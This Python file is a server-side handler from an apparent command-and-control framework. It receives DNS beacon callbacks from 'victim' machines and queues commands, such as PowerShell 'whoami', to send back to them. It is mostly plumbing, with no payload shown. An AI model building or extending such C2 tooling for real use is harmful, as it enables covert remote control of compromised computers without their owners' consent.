from socketserver import BaseRequestHandler
import backend.handlers as handlers


class IndividualClientHandler(BaseRequestHandler):
    """ Builtin Functions"""
    def __init__(self, request, client_address, server, handler=None):
        # Superclass initialization
        self.request = request
        self.client_address = client_address
        self.server = server

        # self.queued_commands = [(Commands.POWERSHELL, "whoami"), (Commands.POWERSHELL, "ls")]
        # self.sent_commands = []

        # The model that tracks each controlled machine
        self.protocol_handler = handler or handlers.dns.DNSHandler(
            client_address[0], request[1]
        )

    def update_handler(self, request,  client_address):
        """
        Update this instance to use the new request and socket
        parameters. Originally :module: socketserver.UDPServer
        would create a new instance for each request, this
        method must be called or the request will be sent
        to the previous temporary port used by the beacon
        to call back
        :param request: the request received by the server
        :param client_address: tuple of (IP, port)
        :return: None
        """
        self.client_address = client_address
        self.request = request

    def handle(self):
        """
        The method required by BaseRequestHandler that handles the
        incoming request
        :return:  None
        """
        _, port = self.client_address
        self.protocol_handler.handle_request(self.request, port)

    def queue_command(self, ctype, cmd):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        self.protocol_handler.queue_cmd(ctype, cmd)

    def get_queued_commands(self):
        return self.protocol_handler.queued_commands

    def get_sent_commands(self):
        return self.protocol_handler.sent_commands

